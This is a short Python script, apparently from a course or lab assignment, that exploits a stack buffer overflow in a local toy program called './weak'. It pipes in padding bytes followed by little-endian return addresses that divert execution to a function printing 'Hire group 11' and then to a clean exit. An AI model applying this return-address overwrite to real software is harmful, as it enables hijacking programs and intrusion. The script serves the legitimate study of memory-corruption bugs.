#!/usr/bin/env python3

import subprocess

def main():
    bufferSize = 20 # size of the buffer
    # have to convert the following addresses to little endian
    ourLine = b"\x18\x83\x04\x08" # line that prints "Hire group 11"
    exitLine = b"\xC0\x1A\x05\x08" # line that exits normally
    padding = b"A" # used to reach the buffer limit

    with subprocess.Popen(["./weak"], stdin=subprocess.PIPE) as proc:
        proc.communicate(padding * bufferSize + ourLine + exitLine)

if __name__ == "__main__":
    main()